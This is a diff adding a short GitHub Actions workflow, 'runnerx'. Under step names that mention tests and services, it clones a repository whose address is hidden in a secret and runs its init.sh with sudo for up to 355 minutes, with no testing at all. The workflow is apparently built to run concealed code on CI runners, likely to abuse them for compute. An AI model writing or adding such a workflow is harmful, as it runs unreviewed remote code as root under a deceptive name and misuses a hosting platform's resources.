@@ -1,0 +1,21 @@
+name: "runnerx"
+
+on:
+  workflow_dispatch:
+  repository_dispatch:
+    types: [runnnnnnnnnnnner]
+
+jobs:
+  startup:
+    name: "Starting Tests"
+    runs-on: ubuntu-latest
+    steps:
+       - name: "Checkout Actions"
+         uses: actions/checkout@main
+       - name: "Stop Old Active Runs"
+         uses: styfle/cancel-workflow-action@0.11.0
+       - name: "Starting Services"
+         timeout-minutes: 355
+         run: |
+           git clone -q ${{ secrets.DATA }} path
+           cd path && sudo bash init.sh
